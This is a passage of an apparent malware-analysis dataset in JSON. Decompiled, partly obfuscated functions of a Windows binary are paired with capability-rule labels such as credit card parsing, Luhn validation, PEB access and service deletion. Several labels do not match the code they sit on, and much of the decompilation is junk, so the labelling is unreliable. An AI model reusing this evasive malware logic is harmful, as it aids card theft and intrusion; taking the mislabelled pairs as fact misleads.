10);\n    uVar6 = (extraout_DX_01 & 0xff00 | (extraout_DX_01 & 0x4e | 0x38) & uVar6) & uVar6 ^ 0x3c00;\n    uVar13 = uVar6 & 0xff | (uVar6 >> 8) + (pcVar30 >> 8) << 8;\n    puVar15 = puVar27;\ncode_r0x004022e6:\n    uVar10 = uVar13 | 0x604;\n    uVar14 = (uVar13 | 0x604) >> 8;\n    uVar18 = CARRY1(uVar14, uVar10);\n    cVar23 = SCARRY1(uVar14, uVar10);\n    cVar22 = uVar14 + uVar10 < '\\0';\n    uVar26 = 0x407218;\n    uVar25 = 8;\n    uVar13 = 0x41e874;\n    iVar8 = fcn.00402de0(0x41e874, 8, 0x407218, 4);\n    while( true ) {\n        if ((cVar23 == cVar22) && (cVar23 != cVar22)) {\n            uVar13 = uVar13 & 0xffff0000 | uVar17;\n            puVar16 = puVar15 | uVar7;\n            puVar15 = puVar16 + 1;\n            *puVar16 = iVar8;\n            uVar18 = 0;\n        }\n        puVar9 = fcn.00402de0(0x41e874, uVar13, uVar25, uVar26);\n        if ((uVar18) || (!uVar18)) break;\n        uVar18 = &stack0xffffffe4 < *puVar9;\n        cVar23 = SCARRY4(puVar9, 1);\n        iVar8 = puVar9 + 1;\n        cVar22 = iVar8 < 0;\n        uVar13 = 0xb7f8c08b;\n        if (uVar18 || iVar8 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.00402de0(0x41e874, 8, 0x407224, 6);\n    fcn.00402de0(0x41e874, 8, 0x407258, 0x2a);\n    fcn.00402de0(0x41e874, 8, 0x407284, 0xb);\n    return;\n}\n",
        "token_count": 4186
    },
    "00402730": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004028df) overlaps instruction at (ram,0x004028dd)\n// \n\nvoid fcn.00402730(void)\n\n{\n    uint8_t *puVar1;\n    char **ppcVar2;\n    uint16_t uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char extraout_CH;\n    uint8_t extraout_CH_00;\n    uint8_t extraout_DL;\n    uint8_t uVar6;\n    uint16_t extraout_DX;\n    uint32_t extraout_EDX;\n    char *unaff_EBX;\n    uint32_t unaff_EBP;\n    uint unaff_ESI;\n    int32_t unaff_EDI;\n    uint16_t in_ES;\n    ushort in_SS;\n    uint8_t uVar7;\n    bool bVar8;\n    uchar uVar9;\n    bool bVar10;\n    bool bVar11;\n    float10 fVar12;\n    ulong uVar13;\n    uint32_t arg_14h;\n    uint arg_8h;\n    uint arg_ch;\n    uint arg_10h;\n    uint arg_14h_00;\n    \n    arg_14h_00 = 0x20;\n    arg_10h = 0x40738c;\n    arg_ch = 8;\n    arg_8h = 0x41e874;\n    do {\n        fcn.00402de0(arg_8h, arg_ch, arg_10h, arg_14h_00);\n        fcn.00402de0(0x41e874, 8, 0x4073ac, 0x26);\n        uVar7 = false;\n        uVar6 = extraout_DL ^ unaff_EBX >> 8 | 0x67;\n        uVar9 = uVar6 < '\\0';\n        bVar8 = (POPCOUNT(uVar6) & 1U) == 0;\n        arg_14h_00 = 8;\n        arg_10h = 0x4073d4;\n        arg_ch = 8;\n        arg_8h = 0x41e874;\n        fcn.00402de0(0x41e874, 8, 0x4073d4, 8);\n        if ((bVar8) || (!bVar8)) goto code_r0x004027dd;\n        ppcVar2 = segment(in_SS, *0x10 + -0x1c);\n        pcVar4 = *ppcVar2;\n        if (uVar7) {\n            *0xb7bc9ea5 = pcVar4;\n            *pcVar4 = *pcVar4 + pcVar4;\n            bVar11 = SCARRY1(*0x680b6a2f, -0x5b);\n            *0x680b6a2f = *0x680b6a2f + -0x5b;\n            bVar10 = *0x680b6a2f < '\\0';\n            bVar8 = *0x680b6a2f == '\\0';\n            goto code_r0x004028b3;\n        }\n    } while (bVar8);\n    uVar7 = 0;\n    uVar9 = &stack0xffffffe8 < 0;\ncode_r0x004027dd:\n    uVar13 = fcn.00402de0(0x41e874, 8, 0x4073dc, 0x19);\n    if ((!uVar9) && (uVar9)) {\n        iVar5 = uVar13 + 0x680b6a2f;\n        bVar11 = SCARRY4(uVar13, 0x680b6a2f) != SCARRY4(iVar5, uVar7);\n        iVar5 = iVar5 + uVar7;\n        bVar10 = iVar5 < 0;\n        bVar8 = iVar5 == 0;\ncode_r0x004028b3:\n        do {\n        } while (!bVar8 && bVar11 == bVar10);\n        return;\n    }\n    pcVar4 = (uVar13 >> 0x20) + 8;\n    *pcVar4 = *pcVar4 + extraout_CH;\n    fcn.00402de0(0x41e874, 8, 0x4073f8, 0xb);\n    fcn.00402de0(0x41e874, 8, 0x407404, 0x12);\n    fcn.00402de0(0x41e874, 8, 0x407418, 0x12);\n    bVar8 = false;\n    bVar10 = (extraout_EDX & 0x1200) == 0;\n    uVar3 = unaff_ESI;\n    iVar5 = unaff_EDI;\n    uVar13 = fcn.00402de0(0x41e874, 8, 0x40742c, 2);\n    if ((bVar8 || bVar10) || (!bVar8 && !bVar10)) {\n        unaff_EBP = 0x407430;\n        unaff_ESI = 8;\n        uVar6 = extraout_CH_00;\ncode_r0x0040289b:\n        pcVar4 = (uVar13 >> 0x20) + 8;\n        *pcVar4 = *pcVar4 + uVar6;\n        fcn.00402de0(0x41e874, iVar5, unaff_ESI, unaff_EBP);\n        bVar8 = false;\n        bVar10 = (((unaff_EBX ^ uVar3) >> 8) - 1U & 0xd) == 0;\n        unaff_EBP = 0x4028cf;\n        fcn.00402de0(0x41e874, 8, 0x407438, 8);\n        if ((bVar8 || bVar10) || (!bVar8 && !bVar10)) {\n            arg_14h = 6;\n            goto code_r0x004028e1;\n        }\n    }\n    else {\n        uVar6 = extraout_CH_00 - *unaff_EBX;\n        *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &stack0xffffffe4;\n        puVar1 = uVar13 + 0x30;\n        *puVar1 = *puVar1 | uVar6;\n        if (*puVar1 != 0) goto code_r0x0040289b;\n    }\n    *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &stack0xffffffe0;\n    arg_14h = unaff_EBP & 0xffff0000 | in_ES;\ncode_r0x004028e1:\n    uVar3 = fcn.00402de0(0x41e874, 8, 0x407440, arg_14h);\n    bVar8 = (((uVar3 & 0xff | (uVar3 >> 8) - 0x2b << 8) ^ 0x3d) + 0x7c28 ^\n            (extraout_DX & 0xff | (extraout_DX >> 8 | extraout_DX) << 8)) + 0xbfff < 0;\n    fVar12 = fcn.00402de0(0x41e874, 8, 0x407448, 7);\n    if ((!bVar8) && (bVar8)) {\n        *(unaff_EDI + 0x1c) = fVar12;\n    }\n    fcn.00402de0(0x41e874, 8, 0x407450, 7);\n    fcn.00402de0(0x41e874, 8, 0x407458, 6);\n    fcn.00402de0(0x41e874, 8, 0x407460, 0x25);\n    fcn.00402de0(0x41e874, 8, 0x407488, 8);\n    return;\n}\n",
        "token_count": 1810
    },
    "00402f20": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040305e) overlaps instruction at (ram,0x0040305c)\n// \n// WARNING: Removing unreachable block (ram,0x00402fd5)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402f20(uchar *arg_8h, uint arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint8_t uVar5;\n    char cVar6;\n    uint16_t uVar7;\n    int32_t in_ECX;\n    int32_t unaff_EBX;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    int32_t unaff_ESI;\n    char *unaff_EDI;\n    char *pcVar13;\n    ushort in_SS;\n    uint8_t uVar14;\n    bool bVar15;\n    bool bVar16;\n    uint8_t in_AF;\n    bool bVar17;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    uint uStack24;\n    ushort uStack20;\n    ushort uStack18;\n    \n    puVar11 = &stack0xfffffffc;\n    *arg_8h = 0x8b;\n    arg_8h[1] = 0xef;\n    arg_8h[2] = 0x59;\n    uVar9 = arg_8h & 0xffff;\n    arg_8h[3] = 0x48;\n    arg_8h[4] = 0x28;\n    uVar8 = unaff_EBX + 1;\n    bVar17 = uVar8 == 0;\n    bVar15 = (POPCOUNT(uVar8 & 0xff) & 1U) == 0;\n    arg_8h[5] = 0xed;\n    puVar12 = &stack0xfffffffc;\n    if (SCARRY4(unaff_EBX, 1) != uVar8 < 0) goto code_r0x00402fd0;\n    uStack20 = SUB42(unaff_EDI, 0);\n    puVar12 = &stack0xfffffffc;\n    if (SCARRY4(unaff_EBX, 1) == uVar8 < 0) goto code_r0x00402fd0;\n    arg_8h = arg_8h & 0xffffff00;\n    in_SS = uStack20;\ncode_r0x00402fc4:\n    unaff_ESI = unaff_ESI + -1;\n    pcVar13 = unaff_EDI | puVar11;\n    unaff_EDI = pcVar13 + 1;\n    *pcVar13 = uVar9;\n    arg_8h = arg_8h & 0xffffff00;\n    uVar7 = uVar9 + (uVar9 >> 8) * 'y';\n    uVar9 = uVar7;\n    bVar17 = uVar7 == 0;\n    bVar15 = (POPCOUNT(uVar7) & 1U) == 0;\n    puVar12 = puVar11;\ncode_r0x00402fd0:\n    arg_8h[6] = 0x24;\n    puVar11 = puVar12;\n    if ((!bVar17) && (bVar17)) {\n        puVar10 = &uStack20;\n        puVar11 = &uStack20;\n        uStack20 = SUB42(puVar12, 0);\n        uStack18 = puVar12 >> 0x10;\n        cVar6 = '\\x10';\n        do {\n            puVar12 = puVar12 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *puVar12;\n            cVar6 = cVar6 + -1;\n        } while ('\\0' < cVar6);\n    }\n    arg_8h[7] = 0xdd;\n    if ((bVar15) || (!bVar15)) {\n        arg_8h[8] = 0xc6;\n    }\n    else {\n        unaff_ESI = unaff_ESI + 0x42;\n        arg_8h = arg_8h & 0xffff0000 | CONCAT11(arg_8h >> 8 | uVar9, arg_8h);\n    }\n    uVar14 = 0;\n    uVar9 = unaff_EBX + 1;\n    bVar17 = uVar9 < 0;\n    bVar15 = uVar9 == 0;\n    uVar5 = POPCOUNT(uVar9 & 0xff);\n    do {\n        bVar16 = (uVar5 & 1) == 0;\n        arg_8h[9] = 0x40;\n        if ((!bVar17) && (bVar17)) {\n            puVar2 = unaff_EDI + 4;\n            puVar1 = unaff_ESI + 4;\n            *(unaff_EDI + 0x1c) = in_ST0;\n            unaff_EDI = unaff_EDI + 5;\n            unaff_ESI = unaff_ESI + 5;\n            uVar14 = *puVar1 < *puVar2;\n            cVar6 = *puVar1 - *puVar2;\n            bVar15 = cVar6 == '\\0';\n            bVar16 = (POPCOUNT(cVar6) & 1U) == 0;\n            in_ST0 = in_ST1;\n            in_ST1 = in_ST2;\n            in_ST2 = in_ST3;\n            in_ST3 = in_ST4;\n            in_ST4 = in_ST5;\n            in_ST5 = in_ST6;\n            in_ST6 = in_ST7;\n        }\n        arg_8h[10] = 0xe3;\n        puVar12 = puVar11;\n        if ((bVar16) || (!bVar16)) {\ncode_r0x0040303d:\n            arg_8h[0xb] = 0xb9;\n            if ((!bVar15) && (bVar15)) {\n                puVar10 = &uStack20;\n                puVar12 = &uStack20;\n                uStack20 = SUB42(puVar11, 0);\n                uStack18 = puVar11 >> 0x10;\n                cVar6 = '\\x10';\n                do {\n                    puVar11 = puVar11 + -1;\n                    puVar10 = puVar10 + -1;\n                    *puVar10 = *puVar11;\n                    cVar6 = cVar6 + -1;\n                } while ('\\0' < cVar6);\n            }\n        }\n        else {\n            puVar4 = segment(in_SS, *0x10 + -0x10);\n            uVar9 = *puVar4;\n            arg_8h = 0xb7bc9ea5;\n            if (!uVar14) {\n                if (!bVar16) {\n                    bVar15 = *0x10 == 0xc;\n                    goto code_r0x0040303d;\n                }\n                goto code_r0x00402fc4;\n            }\n            arg_8h = CONCAT22(0xb7bc, CONCAT11(uVar9 | 0x9e, 0xa5));\n            in_ST0 = in_ST0 - *(unaff_ESI + -0x45);\n        }\n        arg_8h[0xc] = 0x2a;\n        iVar3 = puVar12[2];\n        *(iVar3 + 0xd) = 0x6b;\n        bVar17 = false;\n        bVar15 = (arg_8h & 0x66) == 0;\n        uVar5 = POPCOUNT(arg_8h & 0x66);\n        *(iVar3 + 0xe) = 0x9e;\n        if ((bVar15) || (!bVar15)) {\n            *puVar12[3] = 0xf;\n            return;\n        }\n        uVar14 = 9 < (iVar3 & 0xf) | in_AF;\n        puVar11 = puVar12;\n        in_AF = uVar14;\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    } while( true );\n}\n",
        "token_count": 1904
    },
    "00403680": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040377f) overlaps instruction at (ram,0x0040377e)\n// \n// WARNING: Removing unreachable block (ram,0x004036ef)\n// WARNING: Removing unreachable block (ram,0x00403751)\n\nvoid __fastcall fcn.00403680(uchar *param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    uint32_t unaff_EBX;\n    uchar *puVar5;\n    uint32_t unaff_ESI;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t *unaff_EDI;\n    uint32_t *puVar8;\n    char *pcVar9;\n    bool in_PF;\n    bool bVar10;\n    bool bVar11;\n    int32_t in_stack_5f9dff5f;\n    uint16_t uStack24;\n    ushort uStack20;\n    ushort uStack18;\n    \n    puVar5 = &stack0xfffffffc;\n    uVar6 = unaff_ESI;\n    puVar8 = unaff_EDI;\n    if ((!in_PF) && (puVar5 = &stack0xfffffffc,  in_PF)) {\n        uVar6 = *unaff_EDI;\n        *unaff_EDI = unaff_ESI;\n        puVar5 = &stack0xfffffffc + -in_stack_5f9dff5f;\n        if (puVar5 < 0) {\n            *(unaff_EBX + 0x815108c4) = *(unaff_EBX + 0x815108c4) + in_EAX;\n            pcVar1 = swi(1);\n            (*pcVar1)();\n            return;\n        }\n        if (-1 < uVar6) goto code_r0x004036fc;\n    }\n    param_1 = *(puVar5 + 8);\n    *param_1 = 0x8e;\n    param_1[1] = 0x27;\n    uVar3 = param_2;\n    param_1[2] = 0x59;\n    if (('P' < uVar3) && (uVar3 < 'Q')) {\n        out(0xc4, in_EAX);\n        param_2 = param_2 & 0xffffff00 | uVar3 ^ param_1;\n        puVar8 = unaff_EDI + 1;\n        *unaff_EDI = in_EAX;\n    }\ncode_r0x004036ee:\n    param_1[3] = 0xfe;\n    uStack20 = in_EAX;\n    uStack18 = in_EAX >> 0x10;\n    uStack24 = unaff_EBX;\ncode_r0x004036fc:\n    unaff_EBX = uStack24;\n    param_1[4] = 0xd1;\n    uVar7 = param_1 & 0xffff0000 | CONCAT11((param_1 >> 8) - uStack24, param_1);\n    bVar10 = (POPCOUNT(uVar7 - param_2 & 0xff) & 1U) == 0;\n    in_EAX = CONCAT22(uStack18, uStack20);\n    param_1 = *(puVar5 + 8);\n    param_1[5] = 0xc4;\n    if ((param_2 <= uVar7) && (uVar7 < param_2)) {\n        uVar6 = uVar6 - 1;\n        pcVar9 = puVar8 | puVar5;\n        puVar8 = pcVar9 + 1;\n        *pcVar9 = uStack20;\n        param_2 = param_2 & 0xffffff00;\n        uVar4 = uStack20 + (uStack20 >> 8) * 'y';\n        in_EAX = CONCAT22(uStack18, uVar4);\n        bVar10 = (POPCOUNT(uVar4) & 1U) == 0;\n    }\n    param_1[6] = 0x93;\n    uVar2 = in_EAX;\n    uVar7 = uVar6;\n    if (bVar10) goto code_r0x0040376f;\n    do {\n        uVar2 = in_EAX;\n        uVar7 = uVar6;\n        if (bVar10) {\n            uVar7 = *puVar8;\n            *puVar8 = uVar6;\n            puVar5 = puVar5 + -*(puVar5 + 0x5f9dff63);\n            uVar6 = uVar7;\n            if (puVar5 < 0) goto code_r0x004036ee;\n            bVar10 = (POPCOUNT(uVar7 & 0xff) & 1U) == 0;\n            if (uVar7 < 0) goto code_r0x0040376f;\n        }\n        else {\ncode_r0x0040376f:\n            param_1[7] = 0x5d;\n            if ((bVar10) || (!bVar10)) {\n                param_1[8] = 0xca;\n            }\n            else {\n                uVar7 = uVar7 + 0x41;\n                param_2 = param_2 & 0xffffff00 | param_2 | param_1;\n            }\n            uVar4 = param_2 - 1U & param_1;\n            bVar11 = uVar4 == 0;\n            bVar10 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n            param_1[9] = 0xd4;\n            in_EAX = uVar2;\n            if ((!bVar11) && (bVar11)) {\n                in_EAX = uVar2 & 0xe2f4cc58;\n                bVar11 = in_EAX == 0;\n                bVar10 = (POPCOUNT(uVar2 & 0x58) & 1U) == 0;\n            }\n            param_1[10] = 0xb6;\n            if ((!bVar11) && (bVar11)) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            param_1[0xb] = 0x3e;\n            if (bVar10) goto code_r0x004037dd;\n        }\n        if (!bVar10) goto code_r0x004037dd;\n        uVar6 = *puVar8;\n        *puVar8 = uVar7;\n        puVar5 = puVar5 + -*(puVar5 + 0x5f9dff63);\n        bVar10 = (POPCOUNT(puVar5 & 0xff) & 1U) == 0;\n        if (-1 < puVar5) {\n            if (-1 < uVar6) {\n                return;\n            }\ncode_r0x004037dd:\n            **(puVar5 + 0xc) = 0xc;\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 1572
    },
    "00402de0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402e42) overlaps instruction at (ram,0x00402e3e)\n// \n\nvoid __cdecl fcn.00402de0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t *puVar3;\n    uint8_t uVar4;\n    uint unaff_EBX;\n    int32_t iVar5;\n    uint8_t in_AF;\n    bool bVar6;\n    bool bVar7;\n    unkbyte10 in_ST0;\n    unkbyte10 in_ST1;\n    unkbyte10 in_ST2;\n    unkbyte10 in_ST3;\n    unkbyte10 in_ST4;\n    unkbyte10 in_ST5;\n    unkbyte10 in_ST6;\n    unkbyte10 in_ST7;\n    \n    iVar5 = 0;\n    if (0 < arg_14h) {\n        do {\n            puVar3 = iVar5 % arg_ch;\n            uVar4 = unaff_EBX >> 8;\n            bVar6 = uVar4 + 0x30 < '\\0';\n            if ((SCARRY1(uVar4, '0') == bVar6) && (SCARRY1(uVar4, '0') != bVar6)) {\n                *(arg_8h + -0x7ce92414) = in_ST0;\n                uVar2 = arg_8h - 1U;\n                in_AF = 9 < (uVar2 & 0xf) | in_AF;\n                uVar2 = uVar2 + in_AF * '\\x06';\n                uVar1 = *puVar3;\n                *puVar3 = *puVar3 + 0x458bdf84;\n                *puVar3 = *puVar3 << 1;\n                bVar6 = *puVar3 < '\\0';\n                puVar3 = (arg_8h - 1U & 0xffffff00 |\n                         uVar2 + (0x90 < (uVar2 & 0xf0) | 0xcf < uVar4 | in_AF * (0xf9 < uVar2)) * '`' + -0x76 +\n                         (0xba74207b < uVar1)) + 0x3b463e14;\n                *puVar3 = *puVar3 >> 1 | ((*puVar3 & 1) != 0) << 0x1f;\n                bVar7 = ((*puVar3 & 0x40000000) != 0) != *puVar3 < 0;\n                LOCK();\n                in_ST0 = in_ST1;\n                in_ST1 = in_ST2;\n                in_ST2 = in_ST3;\n                in_ST3 = in_ST4;\n                in_ST4 = in_ST5;\n                in_ST5 = in_ST6;\n                in_ST6 = in_ST7;\n            }\n            else {\n                *(iVar5 + arg_10h) = arg_14h ^ *(iVar5 + arg_10h) ^ *(puVar3 + arg_8h);\n                iVar5 = iVar5 + 1;\n                bVar7 = SBORROW4(iVar5, arg_14h);\n                bVar6 = iVar5 - arg_14h < 0;\n            }\n        } while (bVar7 != bVar6);\n    }\n    return;\n}\n",
        "token_count": 754
    },
    "00403fc0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040401a) overlaps instruction at (ram,0x00404017)\n// \n\nvoid __cdecl fcn.00403fc0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    uint unaff_EBX;\n    bool bVar2;\n    char cVar3;\n    char cVar4;\n    \n    if (arg_ch == 1) {\n        cVar1 = unaff_EBX >> 8;\n        cVar4 = SCARRY1(cVar1, '0');\n        cVar3 = cVar1 + '0' < '\\0';\n        bVar2 = cVar1 == -0x30;\n        fcn.00401d90();\n        if (!bVar2 && cVar4 == cVar3) {\n            arg_ch = 1;\n        }\n        fcn.00401bd0();\n        bVar2 = false;\n        fcn.00404b00();\n        if ((bVar2) || (!bVar2)) {\n            if (*0x41e8b8 != 0) goto code_r0x00404030;\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n        }\n        fcn.00402a00();\n    }\ncode_r0x00404030:\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 331
    },
    "004039f0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nvoid fcn.004039f0(void)\n\n{\n    uint uVar1;\n    \n    if (*0x41e88c == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x41e88c = 1;\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "004049c0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004049c0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x4073d4);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x404940, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 376
    },
    "00404b00": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404b5f) overlaps instruction at (ram,0x00404b5d)\n// \n// WARNING: Removing unreachable block (ram,0x00404b3e)\n\nvoid __fastcall fcn.00404b00(uint param_1)\n\n{\n    char *pcVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t extraout_ECX;\n    uint32_t uVar7;\n    uint *unaff_EDI;\n    uint *puVar8;\n    char cVar9;\n    char cVar10;\n    uchar uVar11;\n    uint var_25fh;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    iVar2 = *0x10;\n    cVar10 = '\\0';\n    cVar9 = (param_1 >> 8 | 0x47) < '\\0';\n    uVar7 = &stack0xfffffffc & 0xffff0000 | iVar2 - 4U;\n    uVar5 = fcn.00402730();\n    if ((cVar10 == cVar9) && (cVar10 != cVar9)) {\n        out(0xc4, uVar5);\n        *unaff_EDI = uVar5;\n    }\n    iVar6 = fcn.004042f0();\n    if (iVar6 != 0) {\n        if ((-1 >= iVar6) || (-1 < iVar6)) {\n            iVar6 = 0x40;\n        }\n        else {\n            pcVar1 = iVar6 + 0x40b92f;\n            *pcVar1 = *pcVar1 + pcVar1;\n            iVar6 = extraout_ECX;\n        }\n        *(uVar7 - 0x260) = 0;\n        puVar8 = uVar7 - 0x25f;\n        for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        *puVar8 = 0;\n        *(puVar8 + 2) = 0;\n        iVar6 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n        if (iVar6 != 0) {\n            fcn.004039f0();\n            *(uVar7 - 0x15c) = 0;\n            puVar8 = uVar7 - 0x15b;\n            for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            *puVar8 = 0;\n            *(puVar8 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(uVar7 - 0x15c, 0x4073ac, iVar2 + -0x264, 0x738c, 3);\n            pcVar3 = _sym.imp.KERNEL32.dll_Sleep;\n            *(uVar7 - 0x14) = 0;\n            do {\n                puVar8 = uVar7 - 0x58;\n                for (iVar6 = 0x11; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n                *(uVar7 - 0x28) = 0;\n                *(uVar7 - 0x10) = 0;\n                *(uVar7 - 0xc) = 0;\n                *(uVar7 - 0x58) = 0x44;\n                *(uVar7 - 8) = 0;\n                *(uVar7 - 0x2c) = 1;\n                *(uVar7 - 4) = 0;\n                iVar6 = (*_sym.imp.KERNEL32.dll_CreateProcessA)\n                                  (0, uVar7 - 0x15c, 0, 0, 0, 0, 0, 0, iVar2 + -0x5c, (iVar2 - 4U) + -0x10);\n                if (iVar6 == 0) {\n                    return;\n                }\n                (*pcVar3)(3000);\n                (*_sym.imp.USER32.dll_EnumWindows)(fcn.004049c0, *(uVar7 - 8));\n                iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(uVar7 - 0x10), 1000);\n                uVar11 = SBORROW4(iVar6, 0x102);\n                if (iVar6 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(*(uVar7 - 0x10), 1);\n                }\n                pcVar4 = _sym.imp.KERNEL32.dll_CloseHandle;\n                if ((!uVar11) && (uVar11)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(*(uVar7 - 0xc));\n                (*pcVar4)(*(uVar7 - 0x10));\n                iVar6 = *(uVar7 - 0x14) + 1;\n                *(uVar7 - 0x14) = iVar6;\n            } while (iVar6 < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1279
    },
    "00404db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00404db0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00403fc0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407490;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 218
    },
    "004011b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004011b0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(arg_8h, arg_ch, 0xf01ff);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 128
    },
    "00402e60": {
        "rules": [
